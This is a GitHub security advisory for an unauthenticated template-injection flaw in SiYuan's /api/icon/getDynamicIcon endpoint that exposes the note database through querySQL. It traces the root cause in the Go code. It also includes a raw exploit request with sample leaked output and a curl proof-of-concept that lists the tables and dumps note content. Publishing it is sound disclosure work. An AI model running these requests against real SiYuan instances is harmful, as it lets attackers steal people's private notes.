# [M] SiYuan: Unauthenticated SQLite Data Exfiltration via Template Injection in /api/icon/getDynamicIcon

## Summary
Severity: Medium
Advisory: GHSA-gcm7-57gf-953c
CVE: CVE-2026-54068
CWE: CWE-306
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-10
Source: https://github.com/advisories/GHSA-gcm7-57gf-953c
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260628153353-2d5d72223df4

## Details
### Summary

The `/api/icon/getDynamicIcon` endpoint is explicitly excluded from authentication in SiYuan's kernel router (`router.go`, "不需要鉴权" -- no auth needed). When called with `type=8` and a valid block `id` parameter, this endpoint invokes `RenderDynamicIconContentTemplate`, which executes a Go template that includes the `querySQL` and `queryBlocks` functions. These functions run arbitrary SELECT statements against the SiYuan SQLite database. An unauthenticated network-adjacent attacker who knows a valid block ID can exfiltrate all user note content, tags, asset references, and block attributes from the database.

### Details

**Root cause -- kernel/api/router.go, line 37:**

```go
// 不需要鉴权
ginServer.Handle("GET", "/api/icon/getDynamicIcon", getDynamicIcon)
```

**Attack chain:**

1. `getDynamicIcon` (kernel/api/icon.go) checks `type=8` and calls `model.RenderDynamicIconContentTemplate(content, id)` when `content` contains `.action{`.

2. `RenderDynamicIconContentTemplate` (kernel/model/template.go:264) parses `content` as a Go template. The template function map includes `querySQL` and `queryBlocks` registered via `sql.SQLTemplateFuncs`.

3. `querySQL` calls `Query(stmt, 1024)` (kernel/sql/block_query.go) which executes the SQL statement against the SQLite database containing all user notes.

4. The SQL result is rendered into the SVG response body and returned to the unauthenticated caller.

**Constraint:** The block `id` parameter must be a valid block ID that exists in the database. Block IDs are 22-character strings in the format `YYYYMMDDHHMMSS-XXXXXXX` (timestamp + 7 alphanumeric chars). Valid IDs are embedded in shared document URLs and can be leaked through any other authenticated endpoint, referrer headers, or browser history.

**Tested on SiYuan v3.6.5 (Docker, network-serving mode, access auth code enabled):**

```
GET /api/icon/getDynamicIcon?type=8&content=.action{querySQL+"SELECT+id,content+FROM+blocks+LIMIT+5"}&id=<KNOWN_BLOCK_ID>
Host: siyuan.example.com
(No Authorization header)
```

Response (SVG with exfiltrated data embedded):
```xml
<text ...>[map[id:20260524010447-jc9ypd4 content:test]
           map[id:20260524011002-ttaa7lu content:My password is SuperSecret123!]]</text>
```

The `querySQL` template function can query any table: `blocks` (all note content and metadata), `spans` (tags), `assets` (asset references), `attributes` (block attributes), and `refs` (backlinks).

### PoC

```bash
TARGET="http://siyuan.example.com:6806"
BLOCK_ID="KNOWN_BLOCK_ID_HERE"  # From a shared link or other source

# List all database tables
curl -s "${TARGET}/api/icon/getDynamicIcon?type=8&content=.action%7BquerySQL+%22SELECT+name+FROM+sqlite_master+WHERE+type%3D%27table%27%22%7D&id=${BLOCK_ID}"

# Dump all note content
curl -s "${TARGET}/api/icon/getDynamicIcon?type=8&content=.action%7BquerySQL+%22SELECT+id%2Ctype%2Ccontent+FROM+blocks+LIMIT+100%22%7D&id=${BLOCK_ID}"
```

**PoC script:** `/home/mrrobot/GoogleDrive/vuln-research/siyuan/scripts/poc_getDynamicIcon_sqli.sh`

### Impact

Any network-reachable SiYuan instance (Docker deployments default to `0.0.0.0:6806`) is vulnerable to complete note content exfiltration without authentication, provided the attacker can obtain one valid block ID. Block IDs are leaked in shared document URLs, embedded images referencing block IDs, and browser history. In a networked deployment scenario (e.g., a self-hosted SiYuan accessible from the internet), all personal notes, tags, and metadata are exposed to unauthenticated attackers.

This vulnerability is distinct from previously reported SQL injection issues (GHSA-j7wh-x834-p3r7) which targeted the search API. The `getDynamicIcon` endpoint was never intended to execute SQL queries but gained this capability through the `querySQL` template function registered for the icon content template renderer.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-gcm7-57gf-953c
- https://nvd.nist.gov/vuln/detail/CVE-2026-54068
- https://github.com/siyuan-note/siyuan
